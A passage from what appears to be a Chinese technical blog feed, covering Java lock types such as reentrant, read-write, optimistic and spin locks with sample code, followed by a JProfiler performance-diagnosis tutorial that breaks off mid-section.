function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//就是这里</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> nextc <span class="token operator">=</span> c <span class="token operator">+</span> acquires<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// overflow</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setState</span><span class="token punctuation">(</span>nextc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在AQS中维护了一个private volatile int state来计数重入次数，避免了频繁的持有释放操作，这样既提升了效率，又避免了死锁。</p><h2 id="独享锁-共享锁"><a href="#独享锁-共享锁" class="headerlink" title="独享锁 / 共享锁"></a>独享锁 / 共享锁</h2><p>独享锁和共享锁在你去读C.U.T包下的ReeReentrantLock和ReentrantReadWriteLock你就会发现，它俩一个是独享一个是共享锁。</p><ul><li><strong>独享锁</strong>：该锁每一次只能被一个线程所持有。</li><li><strong>共享锁</strong>：该锁可被多个线程共有，典型的就是ReentrantReadWriteLock里的读锁，它的读锁是可以被共享的，但是它的写锁确每次只能被独占。</li></ul><p>另外读锁的共享可保证并发读是非常高效的，但是读写和写写，写读都是互斥的。</p><p>独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。<br>对于Synchronized而言，当然是独享锁。</p><h2 id="互斥锁-读写锁"><a href="#互斥锁-读写锁" class="headerlink" title="互斥锁 / 读写锁"></a>互斥锁 / 读写锁</h2><p><strong>互斥锁</strong></p><p>在访问共享资源之前对进行加锁操作，在访问完成之后进行解锁操作。 加锁后，任何其他试图再次加锁的线程会被阻塞，直到当前进程解锁。</p><p>如果解锁时有一个以上的线程阻塞，那么所有该锁上的线程都被编程就绪状态， 第一个变为就绪状态的线程又执行加锁操作，那么其他的线程又会进入等待。 在这种方式下，只有一个线程能够访问被互斥锁保护的资源</p><p><strong>读写锁</strong></p><p>读写锁既是互斥锁，又是共享锁，read模式是共享，write是互斥(排它锁)的。</p><p><strong>读写锁有三种状态</strong>：读加锁状态、写加锁状态和不加锁状态</p><p><strong>读写锁在Java中的具体实现就是</strong><code>ReadWriteLock</code></p><p>一次只有一个线程可以占有写模式的读写锁，但是多个线程可以同时占有读模式的读写锁。<br>只有一个线程可以占有写状态的锁，但可以有多个线程同时占有读状态锁，这也是它可以实现高并发的原因。当其处于写状态锁下，任何想要尝试获得锁的线程都会被阻塞，直到写状态锁被释放；如果是处于读状态锁下，允许其它线程获得它的读状态锁，但是不允许获得它的写状态锁，直到所有线程的读状态锁被释放；为了避免想要尝试写操作的线程一直得不到写状态锁，当读写锁感知到有线程想要获得写状态锁时，便会阻塞其后所有想要获得读状态锁的线程。所以读写锁非常适合资源的读操作远多于写操作的情况。</p><h2 id="乐观锁-悲观锁"><a href="#乐观锁-悲观锁" class="headerlink" title="乐观锁 / 悲观锁"></a>乐观锁 / 悲观锁</h2><p><strong>悲观锁</strong></p><p>总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（<strong>共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程</strong>）。传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。<code>Java</code>中<code>synchronized</code>和<code>ReentrantLock</code>等独占锁就是悲观锁思想的实现。</p><p><strong>乐观锁</strong></p><p>总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现。乐<strong>观锁适用于多读的应用类型，这样可以提高吞吐量</strong>，像数据库提供的类似于<code>write_condition</code>机制，其实都是提供的乐观锁。在<code>Java</code>中<code>java.util.concurrent.atomic</code>包下面的<strong>原子变量类就是使用了乐观锁的一种实现方式CAS实现的</strong>。</p><h2 id="分段锁"><a href="#分段锁" class="headerlink" title="分段锁"></a>分段锁</h2><p>分段锁其实是一种锁的设计，并不是具体的一种锁，对于<code>ConcurrentHashMap</code>而言，其并发的实现就是通过分段锁的形式来实现高效的并发操作。</p><p>并发容器类的加锁机制是基于粒度更小的分段锁，分段锁也是提升多并发程序性能的重要手段之一。</p><p>在并发程序中，串行操作是会降低可伸缩性，并且上下文切换也会减低性能。在锁上发生竞争时将通水导致这两种问题，使用独占锁时保护受限资源的时候，基本上是采用串行方式—-每次只能有一个线程能访问它。所以对于可伸缩性来说最大的威胁就是独占锁。</p><p><strong>我们一般有三种方式降低锁的竞争程度</strong>：<br>1、减少锁的持有时间<br>2、降低锁的请求频率<br>3、使用带有协调机制的独占锁，这些机制允许更高的并发性。</p><p>在某些情况下我们可以将锁分解技术进一步扩展为一组独立对象上的锁进行分解，这成为分段锁。</p><p><strong>其实说的简单一点就是</strong>：</p><p>容器里有多把锁，每一把锁用于锁容器其中一部分数据，那么当多线程访问容器里不同数据段的数据时，线程间就不会存在锁竞争，从而可以有效的提高并发访问效率，这就是<code>ConcurrentHashMap</code>所使用的锁分段技术，首先将数据分成一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段数据的时候，其他段的数据也能被其他线程访问。</p><p>比如：在ConcurrentHashMap中使用了一个包含16个锁的数组，每个锁保护所有散列桶的1/16，其中第N个散列桶由第（N mod 16）个锁来保护。假设使用合理的散列算法使关键字能够均匀的分部，那么这大约能使对锁的请求减少到越来的1/16。也正是这项技术使得ConcurrentHashMap支持多达16个并发的写入线程。</p><h2 id="偏向锁-轻量级锁-重量级锁"><a href="#偏向锁-轻量级锁-重量级锁" class="headerlink" title="偏向锁 / 轻量级锁 / 重量级锁"></a>偏向锁 / 轻量级锁 / 重量级锁</h2><p><strong>锁的状态</strong>：</p><ul><li>无锁状态</li><li>偏向锁状态</li><li>轻量级锁状态</li><li>重量级锁状态</li></ul><p>锁的状态是通过对象监视器在对象头中的字段来表明的。<br>四种状态会随着竞争的情况逐渐升级，而且是不可逆的过程，即不可降级。<br><strong>这四种状态都不是Java语言中的锁</strong>，而是Jvm为了提高锁的获取与释放效率而做的优化(<strong>使用synchronized时</strong>)。</p><p><strong>偏向锁</strong></p><ul><li>偏向锁是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁。降低获取锁的代价。</li></ul><p><strong>轻量级</strong></p><ul><li>轻量级锁是指当锁是偏向锁的时候，被另一个线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，提高性能。</li></ul><p><strong>重量级锁</strong></p><ul><li>重量级锁是指当锁为轻量级锁的时候，另一个线程虽然是自旋，但自旋不会一直持续下去，当自旋一定次数的时候，还没有获取到锁，就会进入阻塞，该锁膨胀为重量级锁。重量级锁会让其他申请的线程进入阻塞，性能降低。</li></ul><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>我们知道CAS算法是乐观锁的一种实现方式，CAS算法中又涉及到自旋锁，所以这里给大家讲一下什么是自旋锁。</p><h3 id="简单回顾一下CAS算法"><a href="#简单回顾一下CAS算法" class="headerlink" title="简单回顾一下CAS算法"></a>简单回顾一下CAS算法</h3><p><code>CAS</code>是英文单词<code>Compare and Swap</code>（比较并交换），是一种有名的无锁算法。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（<code>Non-blocking Synchronization</code>）。CAS算法涉及到三个操作数</p><ul><li>需要读写的内存值 V</li><li>进行比较的值 A</li><li>拟写入的新值 B</li></ul><p>更新一个变量的时候，只有当变量的预期值A和内存地址V当中的实际值相同时，才会将内存地址V对应的值修改为B，否则不会执行任何操作。一般情况下是一个自旋操作，即不断的重试。</p><h3 id="什么是自旋锁？"><a href="#什么是自旋锁？" class="headerlink" title="什么是自旋锁？"></a>什么是自旋锁？</h3><p><strong>自旋锁（spinlock）：是指当一个线程在获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断的判断锁是否能够被成功获取，直到获取到锁才会退出循环</strong>。</p><p>它是为实现保护共享资源而提出一种锁机制。其实，自旋锁与互斥锁比较类似，它们都是为了解决对某项资源的互斥使用。<strong>无论是互斥锁，还是自旋锁，在任何时刻，最多只能有一个保持者，也就说，在任何时刻最多只能有一个执行单元获得锁</strong>。但是两者在调度机制上略有不同。对于互斥锁，如果资源已经被占用，资源申请者只能进入睡眠状态。但是自旋锁不会引起调用者睡眠，如果自旋锁已经被别的执行单元保持，调用者就一直循环在那里看是否该自旋锁的保持者已经释放了锁，”自旋”一词就是因此而得名。</p><h3 id="Java如何实现自旋锁？"><a href="#Java如何实现自旋锁？" class="headerlink" title="Java如何实现自旋锁？"></a>Java如何实现自旋锁？</h3><p>下面是个简单的例子：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpinLock</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> AtomicReference<span class="token operator">&lt;</span>Thread<span class="token operator">></span> cas <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token operator">&lt;</span>Thread<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 利用CAS</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>cas<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// DO nothing</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cas<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>lock（)方法利用的CAS，当第一个线程A获取锁的时候，能够成功获取到，不会进入while循环，如果此时线程A没有释放锁，另一个线程B又来获取锁，此时由于不满足CAS，所以就会进入while循环，不断判断是否满足CAS，直到A线程调用unlock方法释放了该锁。</p><h3 id="自旋锁存在的问题"><a href="#自旋锁存在的问题" class="headerlink" title="自旋锁存在的问题"></a>自旋锁存在的问题</h3><p>1、如果某个线程持有锁的时间过长，就会导致其它等待获取锁的线程进入循环等待，消耗CPU。使用不当会造成CPU使用率极高。<br>2、上面Java实现的自旋锁不是公平的，即无法满足等待时间最长的线程优先获取锁。不公平的锁就会存在“线程饥饿”问题。</p><h3 id="自旋锁的优点"><a href="#自旋锁的优点" class="headerlink" title="自旋锁的优点"></a>自旋锁的优点</h3><p>1、自旋锁不会使线程状态发生切换，一直处于用户态，即线程一直都是active的；不会使线程进入阻塞状态，减少了不必要的上下文切换，执行速度快<br>2、非自旋锁在获取不到锁的时候会进入阻塞状态，从而进入内核态，当获取到锁的时候需要从内核态恢复，需要线程上下文切换。 （线程被阻塞后便进入内核（Linux）调度状态，这个会导致系统在用户态与内核态之间来回切换，严重影响锁的性能）</p><h3 id="可重入的自旋锁和不可重入的自旋锁"><a href="#可重入的自旋锁和不可重入的自旋锁" class="headerlink" title="可重入的自旋锁和不可重入的自旋锁"></a>可重入的自旋锁和不可重入的自旋锁</h3><p>文章开始的时候的那段代码，仔细分析一下就可以看出，它是不支持重入的，即当一个线程第一次已经获取到了该锁，在锁释放之前又一次重新获取该锁，第二次就不能成功获取到。由于不满足CAS，所以第二次获取会进入while循环等待，而如果是可重入锁，第二次也是应该能够成功获取到的。</p><p>而且，即使第二次能够成功获取，那么当第一次释放锁的时候，第二次获取到的锁也会被释放，而这是不合理的。</p><p>为了实现可重入锁，我们需要引入一个计数器，用来记录获取锁的线程数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReentrantSpinLock</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> AtomicReference<span class="token operator">&lt;</span>Thread<span class="token operator">></span> cas <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token operator">&lt;</span>Thread<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread current <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> cas<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 如果当前线程已经获取到了锁，线程数增加一，然后返回</span>            count<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 如果没获取到锁，则通过CAS自旋</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>cas<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// DO nothing</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread cur <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> cas<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 如果大于0，表示当前线程多次获取了该锁，释放锁通过count减一来模拟</span>                count<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 如果count==0，可以将锁释放，这样就能保证获取锁的次数与释放锁的次数是一致的了。</span>                cas<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="自旋锁与互斥锁"><a href="#自旋锁与互斥锁" class="headerlink" title="自旋锁与互斥锁"></a>自旋锁与互斥锁</h3><ul><li>自旋锁与互斥锁都是为了实现保护资源共享的机制。</li><li>无论是自旋锁还是互斥锁，在任意时刻，都最多只能有一个保持者。</li><li>获取互斥锁的线程，如果锁已经被占用，则该线程将进入睡眠状态；获取自旋锁的线程则不会睡眠，而是一直循环等待锁释放。</li></ul><h3 id="自旋锁总结"><a href="#自旋锁总结" class="headerlink" title="自旋锁总结"></a>自旋锁总结</h3><ul><li>自旋锁：线程获取锁的时候，如果锁被其他线程持有，则当前线程将循环等待，直到获取到锁。</li><li>自旋锁等待期间，线程的状态不会改变，线程一直是用户态并且是活动的(active)。</li><li>自旋锁如果持有锁的时间太长，则会导致其它等待获取锁的线程耗尽CPU。</li><li>自旋锁本身无法保证公平性，同时也无法保证可重入性。</li><li>基于自旋锁，可以实现具备公平性和可重入性质的锁。</li></ul><p>本文转载自:  <a href="https://segmentfault.com/a/1190000017766364" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>性能诊断利器JProfiler快速入门和最佳实践</title>
      <link href="/2019/01/08/chang-yong-gong-ju/xing-neng-zhen-duan-li-qi-jprofiler-kuai-su-ru-men-he-zui-jia-shi-jian/"/>
      <url>/2019/01/08/chang-yong-gong-ju/xing-neng-zhen-duan-li-qi-jprofiler-kuai-su-ru-men-he-zui-jia-shi-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="性能诊断利器JProfiler快速入门和最佳实践"><a href="#性能诊断利器JProfiler快速入门和最佳实践" class="headerlink" title="性能诊断利器JProfiler快速入门和最佳实践"></a>性能诊断利器JProfiler快速入门和最佳实践</h1><p><em>摘要：</em> 性能诊断是软件工程师在日常工作中需要经常面对和解决的问题，在用户体验至上的今天，解决好应用的性能问题能带来非常大的收益。Java 作为最流行的编程语言之一，其应用性能诊断一直受到业界广泛关注。可能造成 Java 应用出现性能问题的因素非常多，例如线程控制、磁盘读写、数据库访问、网络I/O、垃圾收集等。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>性能诊断是软件工程师在日常工作中需要经常面对和解决的问题，在用户体验至上的今天，解决好应用的性能问题能带来非常大的收益。Java 作为最流行的编程语言之一，其应用性能诊断一直受到业界广泛关注。可能造成 Java 应用出现性能问题的因素非常多，例如线程控制、磁盘读写、数据库访问、网络I/O、垃圾收集等。想要了定位这些问题，一款优秀的性能诊断工具必不可少。本文将介绍 Java 性能诊断过程中的常用工具，并重点介绍其中的优秀代表 <a href="https://www.ej-technologies.com/products/jprofiler/overview.html" target="_blank" rel="noopener">JProfiler</a> 的基本原理和最佳实践（本文所做的调研基于<code>jprofiler10.1.4</code>）。</p><h1 id="Java-性能诊断工具简介"><a href="#Java-性能诊断工具简介" class="headerlink" title="Java 性能诊断工具简介"></a>Java 性能诊断工具简介</h1><p>在 Java 的世界里，有许多诊断工具可供选择，既包括像 jmap、jstat 这样的简单命令行工具，又包括 JVisualvm、JProfiler 等图形化综合诊断工具，同时还有 SkyWalking、ARMS 这样的针对分布式应用的性能监控系统。下面分别对其进行介绍。</p><h2 id="简单命令行工具"><a href="#简单命令行工具" class="headerlink" title="简单命令行工具"></a>简单命令行工具</h2><p>JDK 内置了许多命令行工具，它们可用来获取目标 JVM 不同方面、不同层次的信息。</p><ul><li>jinfo - 用于实时查看和调整目标 JVM 的各项参数。</li><li>jstack - 用于获取目标 Java 进程内的线程堆栈信息，可用来检测死锁、定位死循环等。</li><li>jmap - 用于获取目标 Java 进程的内存相关信息，包括 Java 堆各区域的使用情况、堆中对象的统计信息、类加载信息等。</li><li>jstat - 一款轻量级多功能监控工具，可用于获取目标 Java 进程的类加载、JIT 编译、垃圾收集、内存使用等信息。</li><li>jcmd - 相比 jstat 功能更为全面的工具，可用于获取目标 Java 进程的性能统计、JFR、内存使用、垃圾收集、线程堆栈、JVM 运行时间等信息。</li></ul><h2 id="图形化综合诊断工具"><a href="#图形化综合诊断工具" class="headerlink" title="图形化综合诊断工具"></a>图形化综合诊断工具</h2><p>使用上述命令行工具或组合能帮您获取目标 Java 应用性能相关的基础信息，但它们存在下列局限：</p><ol><li>无法获取方法级别的分析数据，如方法间的调用关系、各方法的调用次数和调用时间等（这对定位应用性能瓶颈至关重要）。</li><li>要求用户登录到目标 Java 应用所在的宿主机上，使用起来不是很方便。</li><li>分析数据通过终端输出，结果展示不够直观。</li></ol><p>下面介绍几款图形化的综合性能诊断工具。</p><h3 id="JVisualvm"><a href="#JVisualvm" class="headerlink" title="JVisualvm"></a>JVisualvm</h3><p><a href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jvisualvm.html" target="_blank" rel="noopener">JVisualvm</a> 是 JDK 内置的可视化性能诊断工具，它通过 JMX、jstatd、Attach API 等方式获取目标 JVM 的分析数据，包括 CPU 使用率、内存使用量、线程堆栈信息等。此外，它还能直观地展示 Java 堆中各对象的数量和大小、各 Java 方法的调用次数和执行时间等。</p><h3 id="JProfiler"><a href="#JProfiler" class="headerlink" title="JProfiler"></a>JProfiler</h3><p><a href="https://www.ej-technologies.com/products/jprofiler/overview.html" target="_blank" rel="noopener">JProfiler</a> 是由 ej-technologies 公司开发的一款 Java 应用性能诊断工具。它聚焦于四个重要主题上。</p><ol><li>方法调用 - 对方法调用的分析可以帮助您了解应用程序正在做什么，并找到提高其性能的方法。</li><li>内存分配 - 通过分析堆上对象、引用链和垃圾收集能帮您修复内存泄漏问题，优化内存使用。</li><li>线程和锁 - JProfiler 提供多种针对线程和锁的分析视图助您发现多线程问题。</li><li>高级子系统 - 许多性能问题都发生在更高的语义级别上。例如，对于JDBC调用，您可能希望找出执行最慢的 SQL 语句。JProfiler 支持对这些子系统进行集成分析。</li></ol><h2 id="分布式应用性能诊断"><a href="#分布式应用性能诊断" class="headerlink" title="分布式应用性能诊断"></a>分布式应用性能诊断</h2><p>如果只需要诊断单机 Java 应用的性能瓶颈，上面介绍的诊断工具就已经够用了。但随着现代系统架构逐渐从单体转变为分布式、微服务，单纯使用上述工具往往无法满足需求，这时就需要借助 <a href="https://github.com/jaegertracing/jaeger">Jaeger</a>、<a href="https://cn.aliyun.com/product/arms" target="_blank" rel="noopener">ARMS</a>、<a href="https://github.com/apache/incubator-skywalking">SkyWalking</a> 这些分布式追踪系统提供的全链路追踪功能。分布式追踪系统种类繁多，但实现原理都大同小异，它们通过代码埋点的方式记录 tracing 信息，通过 SDK 或 agent 将记录的数据传输至中央处理系统，最后提供 query 接口对结果进行展示和分析，想了解更多分布式追踪系统的原理可参考文章<a href="https://yq.aliyun.com/articles/514488" target="_blank" rel="noopener">开放分布式追踪（OpenTracing）入门与 Jaeger 实现</a>。</p><h1 id="JProfiler-简介"><a href="#JProfiler-简介" class="headerlink" title="JProfiler 简介"></a>JProfiler 简介</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><p>JProfiler 包含用于采集目标 JVM 分析数据的 JProfiler agent、用于可视化分析数据的 JProfiler UI、提供各种功能的命令行工具，它们之间的关系如下图所示。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/6bc2c975d54e012fb9660ea568501766.png" alt="jprofiler"></p><h3 id="JProfiler-agent"><a href="#JProfiler-agent" class="headerlink" title="JProfiler agent"></a>JProfiler agent</h3><p>JProfiler agent 是一个本地库，它可以在 JVM 启动时通过参数<code>-agentpath:&lt;path to native library&gt;</code>进行加载或者在程序运行时通过 <a href="http://lovestblog.cn/blog/2014/06/18/jvm-attach/" target="_blank" rel="noopener">JVM Attach 机制</a>进行加载。Agent 被成功加载后，会设置 JVMTI 环境，监听虚拟机产生的事件，如类加载、线程创建等。例如，当它监听到类加载事件后，会给这些类注入用于执行度量操作的字节码。</p><h3 id="JProfiler-UI"><a href="#JProfiler-UI" class="headerlink" title="JProfiler UI"></a>JProfiler UI</h3><p>JProfiler UI 是一个可独立部署的组件，它通过 socket 和 agent 建立连接。这意味着不论目标 JVM 运行在本地还是远端，JProfiler UI 和 agent 间的通信机制都是一样的。</p><p>JProfiler UI 的主要功能是展示通过 agent 采集上来的分析数据，此外还可以通过它控制 agent 的采集行为，将快照保存至磁盘，展示保存的快照。</p><h3 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h3><p>JProfiler 提供了一系列命令行工具以实现不同的功能。</p><ul><li>jpcontroller - 用于控制 agent 的采集行为。它通过 agent 注册的 JProfiler MBean 向 agent 传递命令。</li><li>jpenable - 用于将 agent 加载到一个正在运行的 JVM 上。</li><li>jpdump - 用于获取正在运行的 JVM 的堆快照。</li><li>jpexport &amp; jpcompare - 用于从保存的快照中提取数据并创建 HTML 报告。</li></ul><h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><p>JProfiler 同时支持诊断本地和远程 Java 应用的性能。如果您需要实时采集并展示远程 JVM 的分析数据，需要完成以步骤：</p><ol><li>在本地安装 JProfiler UI。</li><li>在远程宿主机上安装 JProfiler agent 并让其被目标 JVM 加载。</li><li>配置 UI 到 agent 的连接。</li></ol><p>具体步骤可参考文档 <a href="https://www.ej-technologies.com/resources/jprofiler/help/doc/#jprofiler.installing" target="_blank" rel="noopener">Installing JProfiler</a> 和 <a href="https://www.ej-technologies.com/resources/jprofiler/help/doc/#jprofiler.profiling" target="_blank" rel="noopener">Profiling A JVM</a>。</p><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><p>本章将以高性能写 LogHub 类库 <a href="https://github.com/aliyun/aliyun-log-producer">Aliyun LOG Java Producer</a> 为原型，带您了解如何使用 JProfiler 剖析它的性能。如果您的应用或者您在使用 producer 的过程中遇到了性能问题，也可以用类似的方式定位问题根因。如果您还不了解 producer 的功能，建议先阅读文章<a href="https://yq.aliyun.com/articles/682762" target="_blank" rel="noopener">日志上云利器 - Aliyun LOG Java Producer</a>。本章使用的样例代码参见 <a href="https://github.com/aliyun/aliyun-log-producer-sample/blob/master/src/main/java/com/aliyun/openservices/aliyun/log/producer/sample/SamplePerformance.java">SamplePerformance.java</a>。</p><h2 id="JProfiler-设置"><a href="#JProfiler-设置" class="headerlink" title="JProfiler 设置"></a>JProfiler 设置</h2><h3 id="数据采集模式"><a href="#数据采集模式" class="headerlink" title="数据采集模式"></a>数据采集模式</h3><p>JProfier 提供两种数据采集模式 Sampling 和 Instrumentation。</p><ul><li>Sampling - 适合于不要求数据完全精确的场景。优点是对系统性能的影响较小，缺点是某些特性不支持（如方法级别的统计信息）。</li><li>Instrumentation - 完整功能模式，统计信息也是精确的。缺点是如果需要分析的类比较多，对应用性能影响较大。为了降低影响，往往需要和 Filter 一起使用。</li></ul><p>由于我们需要获取方法级别的统计信息，这里选择了 Instrumentation 模式。同时配置了 Filter，让 agent 只记录位于 Java 包<code>com.aliyun.openservices.aliyun.log.producer</code>下的类和类<code>com.aliyun.openservices.log.Client</code>的 CPU 分析数据。</p><h3 id="应用启动模式"><a href="#应用启动模式" class="headerlink" title="应用启动模式"></a>应用启动模式</h3><p>通过为 JProfiler agent 指定不同的参数可以控制应用的启动模式。</p><ul><li>等待模式 - 只有在 Jprofiler GUI 和 agent 建立连接并完成分析配置设置后，应用才会真正启动。在这种模式下，您能够获取应用启动时期的分析数据。对应的命令为<code>-agentpath:&lt;path to native library&gt;=port=8849</code>。</li><li>立即启动模式 - 应用会立即启动，Jprofiler GUI 会在需要时和 agent 建立连接并设置分析配置。这种模式相对灵活，但会丢失应用启动初期的分析数据。对应的命令为<code>-agentpath:&lt;path to native library&gt;=port=8849,nowait</code>。</li><li>离线模式 - 通过触发器记录数据、保存快照供事后分析。对应的命令为<code>-agentpath:&lt;path to native library&gt;=offline,id=xxx,config=/config.xml</code>。</li></ul><p>因为是在测试环境，同时对应用启动初期的性能也比较关注，这里选择了默认的等待模式。</p><h2 id="使用-JProfiler-诊断性能"><a href="#使用-JProfiler-诊断性能" class="headerlink" title="使用 JProfiler 诊断性能"></a>使用 JProfiler 诊断性能</h2><p>在完成 JProfiler 的设置后，便可以对 Producer 的性能进行诊断。</p><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>在概览页我们可以清晰的看到内存使用量、垃圾收集活动、类加载数量、线程个数和状态、CPU 使用率等指标随时间变化的趋势。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/c53e7d213800d52649adb0428614d5fa.png" alt="overview"></p><p>通过此图，我们可以作出如下基本判断：</p><ol><li>程序在运行过程中会产生大量对象，但这些对象生命周期极短，大部分都能被垃圾收集器及时回收，不会造成内存无限增长。</li><li>加载类的数量在程序初始时增长较快，随后保持平稳，符合预期。</li><li>在程序运行过程中，有大量线程处于阻塞状态，需要重点关注。</li><li>在程序刚启动时，CPU 使用率较高，需要进一步探究其原因。</li></ol><h3 id="CPU-views"><a href="#CPU-views" class="headerlink" title="CPU views"></a>CPU views</h3><p>CPU views 